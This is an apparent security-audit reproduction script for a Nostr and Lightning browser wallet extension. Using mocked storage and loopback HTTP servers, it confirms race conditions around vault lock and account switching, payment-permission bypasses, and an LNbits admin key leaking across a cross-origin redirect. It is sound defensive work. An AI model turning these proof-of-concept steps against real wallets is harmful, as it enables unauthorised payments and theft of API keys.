// Audit evidence: these assertions confirm vulnerable behavior, not security acceptance.
// Synthetic accounts, mocked wallets, and loopback HTTP servers only.
// Run from repo root with: node --import tsx --import ./tests/helpers/register-mocks.ts docs/audits/2026-09-10/reproduce.mjs
import assert from 'node:assert/strict';
import { Buffer } from 'node:buffer';
import console from 'node:console';
import { setTimeout } from 'node:timers';
import { createServer } from 'node:http';
import { once } from 'node:events';
import browser, { resetMockStorage } from '../../../tests/helpers/browser-mock.ts';
import * as vault from '../../../src/services/vault/vault.ts';
import * as signer from '../../../src/services/signing/signer.ts';
import * as permissions from '../../../src/services/permissions/permissions.ts';
import { LnbitsProvider } from '../../../src/services/wallet/lnbits.ts';
import { handlers } from '../../../src/services/background/wallet-handlers.ts';
import { setWalletProvider, clearWalletProviders } from '../../../src/services/wallet/index.ts';
import { getPublicKey } from 'nostr-tools/pure';
import { nip04Decrypt } from '../../../src/lib/crypto/nip04.ts';
import * as queue from '../../../src/services/signing/approvalQueue.ts';
import { handlers as vaultHandlers } from '../../../src/services/background/vault-handlers.ts';
const password = 'audit-only-password';
const keys = [new Uint8Array(32).fill(21), new Uint8Array(32).fill(22)];
const accounts = keys.map((key, i) => ({ id: `audit-${i}`, name: `Audit ${i}`, type: 'nsec', pubkey: getPublicKey(key), privkey: Buffer.from(key).toString('hex'), mnemonic: null, nip46Config: null, readOnly: false, createdAt: 1, walletConfig: { type: 'lnbits', instanceUrl: 'https://wallet.invalid', adminKey: 'synthetic-key' } }));
async function setup() { resetMockStorage(); vault.lock(); permissions.invalidateCache(); clearWalletProviders(); await vault.create(password, { accounts, activeAccountId: accounts[0].id }); await browser.storage.local.set({ accounts, activeAccountId: accounts[0].id }); await browser.storage.sync.set({ myPubkey: accounts[0].pubkey }); }
async function switchB() { await vault.setActiveAccount(accounts[1].id); await browser.storage.local.set({ activeAccountId: accounts[1].id }); await browser.storage.sync.set({ myPubkey: accounts[1].pubkey }); }
await setup();
// Pause the storage read inside unlock, then issue a later explicit lock.
const originalGet = browser.storage.local.get.bind(browser.storage.local);
let release, entered;
const gate = new Promise(r => release = r), started = new Promise(r => entered = r);
browser.storage.local.get = async (...args) => { const result = await originalGet(...args); entered(); await gate; return result; };
const unlocking = vault.unlock(password);
await started;
vault.lock();
release();
await unlocking;
browser.storage.local.get = originalGet;
assert.equal(vault.isLocked(), false);
console.log('CONFIRMED: earlier unlock overrides later explicit lock');
await setup();
await permissions.save('audit.invalid', 'nip04Encrypt', null, 'allow', accounts[0].id);
// A is captured by identity lookup; switch while the following exists() read awaits.
let intercepted = false;
browser.storage.local.get = async (...args) => { const result = await originalGet(...args); if (!intercepted && typeof args[0] === 'string' && args[0].toLowerCase().includes('vault')) {
    intercepted = true;
    await switchB();
} return result; };
const encrypted = await signer.handleNip04Encrypt(accounts[1].pubkey, 'audit message', 'audit.invalid');
browser.storage.local.get = originalGet;
assert.equal(intercepted, true);
assert.equal(vault.getActiveAccountId(), accounts[1].id);
assert.equal(await nip04Decrypt(encrypted, keys[1], Buffer.from(accounts[0].pubkey, 'hex')), 'audit message');
console.log('CONFIRMED: crypto request uses A after active account changes to B');
await setup();
let paid = 0;
setWalletProvider(accounts[0].id, { type: 'lnbits', isConnected: () => false, connect: async () => { await switchB(); }, disconnect: () => { }, payInvoice: async () => { paid++; return { preimage: 'synthetic' }; } });
await browser.storage.local.set({ [`walletThreshold_${accounts[1].id}`]: 999999 });
const invoice = 'lnbc2500u1pvjluezpp5qqqsyqcyq5rqwzqfqqqsyqcyq5rqwzqfqqqsyqcyq5rqwzqfqypqdq5xysxxatsyp3k7enxv4jsxqzpuaztrnwngzn3kdzw5hydlzf03qdgm2hdq27cqv3agm2awhz5se903vruatfhq77w3ls4evs3ch9zw97j25emudupq63nyw24cg27h2rspfj9srp';
await handlers.get('webln_sendPayment')({ origin: 'audit.invalid', paymentRequest: invoice });
assert.equal(paid, 1);
assert.equal(vault.getActiveAccountId(), accounts[1].id);
console.log('CONFIRMED: B threshold authorizes payment through A provider');
await setup();
paid = 0;
setWalletProvider(accounts[0].id, { type: 'lnbits', isConnected: () => true, disconnect: () => { }, payInvoice: async () => { paid++; return { preimage: 'synthetic' }; } });
await permissions.setUseGlobalDefaults(false);
await permissions.save('audit.invalid', 'webln_sendPayment', null, 'deny', accounts[0].id);
await browser.storage.local.set({ [`walletThreshold_${accounts[0].id}`]: 999999 });
await handlers.get('webln_sendPayment')({ origin: 'audit.invalid', paymentRequest: invoice });
assert.equal(paid, 1);
console.log('CONFIRMED: account-specific WebLN deny ignored when threshold permits payment');
await setup();
paid = 0;
setWalletProvider(accounts[0].id, { type: 'lnbits', isConnected: () => true, disconnect: () => { }, payInvoice: async () => { paid++; return { preimage: 'synthetic' }; } });
const payment = handlers.get('webln_sendPayment')({ origin: 'audit.invalid', paymentRequest: invoice });
let pending;
for (let i = 0; i < 100; i++) {
    pending = (await queue.getPending())[0];
    if (pending)
        break;
    await new Promise(r => setTimeout(r, 5));
}
assert.ok(pending);
await new Promise(r => setTimeout(r, 20));
await vaultHandlers.get('vault_lock')({});
await queue.resolveRequest(pending.id, { allow: true });
await payment;
assert.equal(vault.isLocked(), true);
assert.equal(paid, 1);
console.log('CONFIRMED: queued payment executes after explicit vault lock when approved');
clearWalletProviders();
vault.lock();
let received = '';
const receiver = createServer((req, res) => { received = String(req.headers['x-api-key'] || ''); res.setHeader('Content-Type', 'application/json'); res.end('{"balance":0}'); });
receiver.listen(0, '127.0.0.1');
await once(receiver, 'listening');
const destination = `http://127.0.0.1:${receiver.address().port}`;
const redirector = createServer((_req, res) => { res.writeHead(302, { Location: destination }); res.end(); });
redirector.listen(0, '127.0.0.1');
await once(redirector, 'listening');
try {
    await new LnbitsProvider({ instanceUrl: `http://127.0.0.1:${redirector.address().port}`, adminKey: 'AUDIT-SYNTHETIC-NOT-A-REAL-KEY' }).getBalance();
    assert.equal(received, 'AUDIT-SYNTHETIC-NOT-A-REAL-KEY');
    console.log('CONFIRMED: cross-origin redirect receives LNbits admin header (Node fetch)');
}
finally {
    redirector.closeAllConnections();
    receiver.closeAllConnections();
    redirector.close();
    receiver.close();
}
